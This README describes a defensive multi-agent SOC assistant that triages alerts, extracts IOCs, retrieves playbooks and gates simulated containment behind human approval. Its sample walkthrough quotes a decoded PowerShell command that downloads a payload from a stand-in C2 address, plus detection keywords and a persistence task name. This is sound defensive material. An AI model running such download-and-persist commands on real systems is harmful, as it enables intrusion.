# Agentic SOC Copilot 🛡️

[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.110+-009688.svg)](https://fastapi.tiangolo.com)
[![LangGraph](https://img.shields.io/badge/LangGraph-Multi--Agent-orange.svg)](https://github.com/langchain-ai/langgraph)
[![Tests Passing](https://img.shields.io/badge/pytest-passing-success.svg)](https://pytest.org)
[![Docker Ready](https://img.shields.io/badge/Docker-Ready-2496ED.svg)](https://www.docker.com)

> An enterprise-grade, autonomous Security Operations Center (SOC) assistant built with **LangGraph**, **FastAPI**, **RAG (TF-IDF Playbooks)**, **SQLite Incident Memory**, and **Human-in-the-Loop Safeguards**.

---

## 📌 Problem Statement

Modern Security Operations Centers (SOCs) face critical operational bottlenecks:
1. **Alert Fatigue**: Tier-1 analysts are flooded with thousands of security telemetry alerts per day, resulting in delayed detection and burnout.
2. **Context Switching**: Analysts manually toggle between alert consoles, SIEM logs, threat intelligence platforms, and static Word/Confluence playbooks.
3. **Execution Errors in Containment**: Unvetted automated containment can cause catastrophic outages on critical production servers, while manual execution introduces latency during active breaches.

**Agentic SOC Copilot** solves this by orchestrating a team of specialized AI agents that ingest raw alerts, score severity, extract indicators of compromise (IOCs), ground response decisions in enterprise playbooks via RAG, and prepare containment actions gated by a strict **Human-in-the-Loop** approval mechanism.

---

## 🏗️ Architecture & Agent Workflow

```
                        [ Incoming Security Alert / Telemetry ]
                                          │
                                          ▼
   ┌─────────────────────────────────────────────────────────────────────────────┐
   │                     LangGraph Multi-Agent State Pipeline                    │
   │                                                                             │
   │  [1. Triage Agent]                                                          │
   │    ├── Tool: analyze_events()                                               │
   │    └── Determines Severity (CRITICAL/HIGH/MED/LOW) & Attack Category        │
   │                  │                                                          │
   │                  ▼                                                          │
   │  [2. Knowledge / RAG Agent]                                                 │
   │    ├── Tool: search_security_knowledge() (TF-IDF Cosine Retrieval)          │
   │    └── Matches relevant Incident Playbooks (PowerShell, Auth, Endpoint)     │
   │                  │                                                          │
   │                  ▼                                                          │
   │  [3. Investigation Agent]                                                   │
   │    ├── Tool: extract_iocs() (Regex IP/Domain/Hash + Base64 UTF-16LE Decoder)│
   │    └── Correlates attacker timeline & behavioral findings                   │
   │                  │                                                          │
   │                  ▼                                                          │
   │  [4. Response Agent]                                                        │
   │    ├── Synthesizes ordered remediation plan (NIST SP 800-61 aligned)        │
   │    └── Formulates discrete simulated actions & issues secure Approval Token │
   └──────────────────────────────────────┬──────────────────────────────────────┘
                                          │
                                          ▼
   ┌─────────────────────────────────────────────────────────────────────────────┐
   │                     Human-in-the-Loop Approval Gate                         │
   │   Analyst reviews evidence, IOCs, and playbooks in the SOC Web Dashboard,   │
   │   and clicks "Authorize & Simulate Containment"                             │
   └──────────────────────────────────────┬──────────────────────────────────────┘
                                          │ (POST /incidents/approve/{token})
                                          ▼
   ┌─────────────────────────────────────────────────────────────────────────────┐
   │                      Simulated Containment Tool                             │
   │  • Validates cryptographic approval token                                   │
   │  • Simulates host isolation, firewall egress drops, and account disablement │
   │  • Updates persistent incident store (SQLite)                               │
   └─────────────────────────────────────────────────────────────────────────────┘
```

---

## 🤖 Detailed Agent Responsibilities

| Agent | Core Responsibility | Tools Invoked | Output Artifacts |
|---|---|---|---|
| **Triage Agent** | Ingests raw telemetry lines, determines alert fidelity, classifies MITRE ATT&CK tactics, and assigns severity rating (`CRITICAL`, `HIGH`, `MEDIUM`, `LOW`). | `analyze_events()` | Severity rating, attack category, triage rationale. |
| **Knowledge / RAG Agent** | Performs vector search across local enterprise playbooks (`data/knowledge_base/`) to ground investigation in approved standard operating procedures. | `search_security_knowledge()` | Top-ranked playbooks with similarity confidence score and relevant containment sections. |
| **Investigation Agent** | Extracts tactical indicators (internal/external IPs, domains, hashes, encoded commands), decodes obfuscated PowerShell script blocks, and synthesizes an end-to-end threat narrative. | `extract_iocs()`, `decode_powershell_base64()` | Structured IOC dictionary and deep investigative narrative. |
| **Response Agent** | Formulates prioritized immediate containment, eradication, and recovery recommendations. Generates candidate containment actions and creates a cryptographic approval token. | `call_llm_response_plan()` | Ordered response steps, candidate containment actions, `approval_token`. |
| **Human Approval Gate** | Enforces safety policy: containment actions remain in `PENDING` state until an authorized human analyst verifies findings and submits approval. | `simulate_containment()` | Simulated execution timestamp audit log, host isolation receipt. |

---

## 🔍 Understandable RAG (Retrieval-Augmented Generation)

Rather than introducing heavy cloud vector databases (e.g. Pinecone, Milvus) that obscure retrieval logic, this project implements a clean, self-contained, mathematically transparent RAG engine in [`app/rag.py`](app/rag.py):
- **Playbook Corpus**: Stored as markdown/text files in [`data/knowledge_base/`](data/knowledge_base/):
  - `powershell_playbook.txt`: Suspicious PowerShell execution, base64 flags, in-memory droppers.
  - `incident_response.txt`: NIST SP 800-61 Rev. 2 containment and eradication lifecycle.
  - `suspicious_login.txt`: Impossible travel, MFA exhaustion, brute-force anomalies.
  - `endpoint_investigation.txt`: Scheduled task persistence, registry run keys, parentage analysis.
- **Vectorization**: Uses scikit-learn's `TfidfVectorizer` with unigram and bigram tokenization (`ngram_range=(1, 2)`) and sublinear term frequency scaling.
- **Semantic Ranking**: Computes cosine similarity between the agent's incident query vector and playbook corpus vectors:
  $$\text{sim}(\mathbf{q}, \mathbf{d}) = \frac{\mathbf{q} \cdot \mathbf{d}}{\|\mathbf{q}\| \|\mathbf{d}\|}$$
- **Zero-Dependency Simplicity**: Highly performant, completely offline-capable, and easily explainable in technical interviews.

---

## 🛠️ Security Analysis Tools

The agents invoke dedicated defensive tools implemented in [`app/tools.py`](app/tools.py):
1. **`analyze_events(raw_events: str) -> dict`**:
   - Parses telemetry lines and extracts event types (Sysmon 1, 3, 11, Firewall).
   - Identifies hosts, usernames, and flags high-risk signatures (e.g., `-enc`, `bypass`, `schtasks /create`).
2. **`extract_iocs(text: str) -> dict`**:
   - Extracts IPv4 addresses and differentiates between **INTERNAL** (RFC 1918) and **EXTERNAL** untrusted destinations.
   - Extracts fully qualified domain names (FQDNs), MD5, and SHA256 hashes.
   - Automatically decodes base64-encoded UTF-16LE PowerShell payloads.
3. **`search_security_knowledge(query: str, top_k: int = 2) -> list[dict]`**:
   - Interfaces with the RAG engine to supply grounding context.
4. **`simulate_containment(approval_token: str, incident_id: str, actions: list[str]) -> dict`**:
   - Strictly simulated containment tool that audits actions (host isolation, firewall block, credential reset) with timestamps and safety disclaimers.

---

## 🛡️ Human-in-the-Loop Safety Guarantee

> [!IMPORTANT]
> **Safety First**: Autonomous AI systems should never unilaterally alter production infrastructure.
- All high-impact actions (network isolation, edge firewall rule creation, account lockouts) are held in a `PENDING` state.
- The system generates a single-use approval token (`tok-<uuid>`).
- Execution only proceeds when an authorized analyst clicks **"Authorize & Simulate Containment"** or calls `POST /incidents/approve/{token}`.
- All actions are strictly simulated in software with full audit logs — zero destructive changes are made to host or network infrastructure.

---

## 🧠 Memory Architecture (SQLite)

Incident state and audit histories are persistently stored in SQLite (`data/incidents.db`):
- **Incident Metadata**: ID, title, severity, attack category, timestamp.
- **Agent Artifacts**: Extracted IOCs JSON, retrieved playbooks JSON, investigation findings markdown, response plan JSON.
- **Audit Logs**: Approval token, status (`PENDING` / `APPROVED`), timestamp of authorization, and simulated containment receipts.
- **REST Access**: Available via `GET /incidents/recent` for historical SOC reporting.

---

## 🔌 Dual-Mode LLM Abstraction

The copilot supports two execution modes configured in [`app/llm.py`](app/llm.py):
1. **Live OpenAI Mode**: When `OPENAI_API_KEY` is provided in `.env`, the copilot uses `ChatOpenAI` (`gpt-4o-mini` by default) with structured prompt templates.
2. **Deterministic Fallback / Demo Mode**: If no API key is provided, the copilot automatically engages an intelligent, deterministic rule-and-heuristic engine. It generates realistic, reproducible SOC findings with zero network latency and no external billing requirements — ensuring the project can be cloned and demonstrated anywhere out-of-the-box.

---

## 🚀 Quick Start Guide

### Prerequisites
- Python 3.11 or higher
- Git

### 1. Clone & Set Up Environment

```bash
# Clone the repository
git clone https://github.com/yourusername/Agentic-SOC-Copilot.git
cd Agentic-SOC-Copilot

# Create and activate a virtual environment
python -m venv .venv

# On Windows:
.venv\Scripts\activate
# On Linux/macOS:
# source .venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

### 2. Configure Environment (Optional)

```bash
# Copy example environment file
cp .env.example .env
```

Edit `.env` if you want to use a live OpenAI key:
```env
OPENAI_API_KEY=sk-...
OPENAI_MODEL=gpt-4o-mini
```
*(If left empty, the application runs in high-fidelity deterministic fallback mode).*

### 3. Run the Application

```bash
uvicorn app.main:app --reload --port 8000
```

Open your browser and navigate to:
👉 **`http://localhost:8000`**

Click **"⚡ Load Sample Incident"** on the dashboard, then click **"🚀 Run Multi-Agent Pipeline"** to watch the multi-agent workflow execute in real time.

---

## 🐳 Running with Docker

You can package and run the entire application in a lightweight container:

```bash
# Build Docker image
docker build -t agentic-soc-copilot .

# Run container
docker run -p 8000:8000 --name soc-copilot agentic-soc-copilot
```

Access the dashboard at **`http://localhost:8000`**.

---

## 🧪 Running Automated Tests

Run the complete test suite with `pytest`:

```bash
pytest -v tests/
```

Test coverage includes:
- `tests/test_tools.py`: Tests IP private/public classification, base64 decoding, IOC regexes, event analysis, and containment simulation.
- `tests/test_rag.py`: Tests playbook loading, TF-IDF vectorization, query scoring, and relevance matching.
- `tests/test_api.py`: Tests `GET /health`, `POST /incidents/analyze`, `GET /incidents/recent`, and `POST /incidents/approve/{token}`.

---

## 📡 REST API Reference

| Endpoint | Method | Description |
|---|---|---|
| `/` | `GET` | Serves the web dashboard (`frontend/index.html`). |
| `/health` | `GET` | System health, active LLM mode, database status, and loaded playbook count. |
| `/incidents/analyze` | `POST` | Ingests `{ incident_id, title, raw_logs }`, executes the LangGraph multi-agent pipeline, and returns complete analysis. |
| `/incidents/recent` | `GET` | Retrieves recent incidents from SQLite memory. |
| `/incidents/approve/{token}` | `POST` | Authorizes simulated containment using the unique single-use approval token. |

---

## 📋 Sample Incident Walkthrough

### Input Telemetry ([`data/sample_incident.json`](data/sample_incident.json))
- **Incident ID**: `INC-2026-8821`
- **Host**: `FIN-WS-042` | **User**: `CORP\jdoe`
- **Telemetry**: Obfuscated PowerShell execution (`-enc SQBuAHY...`), outbound HTTP connection to `198.51.100.23:8080`, drop of `payload.ps1`, and scheduled task persistence creation (`SystemUpdateChecker`).

### Pipeline Execution Output:
1. **Triage Agent**: Classified as **CRITICAL** under `Execution & Persistence (MITRE T1059.001 / T1053)`.
2. **RAG Agent**: Matched `Suspicious PowerShell Execution Investigation & Response (PB-IR-001)` (Relevance: 78.4%) and `Enterprise Incident Response Lifecycle (PB-IR-000)`.
3. **Investigation Agent**:
   - Decoded Command: `Invoke-WebRequest -Uri http://198.51.100.23:8080/update.ps1 -OutFile C:\Windows\Curl\payload.ps1`
   - Internal Asset: `10.0.4.15` (FIN-WS-042)
   - External C2 IP: `198.51.100.23` (Threat Flag: POTENTIAL_C2)
   - Domain: `update-service-check.net`
   - Hashes: `7f83b1657ff1...`, `9b10a43f87b2...`
4. **Response Agent**: Formulated 6 actionable response steps and generated single-use token `tok-a1b2c3d4e5f6`.
5. **Human Analyst Gate**: Analyst clicks **"Authorize & Simulate Containment"**, generating simulated isolation logs for `FIN-WS-042` and firewall drop rules for `198.51.100.23`.

---

## 🎯 Technical Interview Talking Points

When discussing this project in an Agentic AI Engineer interview:
1. **Why LangGraph over linear scripts?**
   - Security incident analysis requires cyclical state passing, conditional branching (e.g. escalating based on triage severity), and explicit node boundaries that mirror SOC Tier 1/2/3 separation of duties.
2. **Why TF-IDF RAG instead of Pinecone/Milvus?**
   - For enterprise playbooks (dozens to hundreds of specialized SOPs), local TF-IDF vectorization with n-gram extraction offers millisecond latency, zero external network dependencies, deterministic testing, and zero infrastructure overhead.
3. **How is hallucination mitigated?**
   - Triage severity and response plans are grounded directly in retrieved playbook snippets. The Investigation Agent combines deterministic regex/decoding tools with LLM synthesis to ensure extracted IOCs are exact matches rather than hallucinated strings.
4. **How is production safety guaranteed?**
   - By implementing an explicit Human-in-the-Loop token gate, agents cannot execute destructive containment actions autonomously. All containment is audited and simulated.

---

## 🔮 Future Enhancements
- Bi-directional webhook integration with real SIEM platforms (Splunk HEC, Microsoft Sentinel).
- Live sandbox detonation integration (Cuckoo / Any.Run API).
- Integration of STIX/TAXII automated threat intelligence feeds.

---

## 📄 License

MIT License. Designed for defensive cybersecurity research and portfolio demonstration.
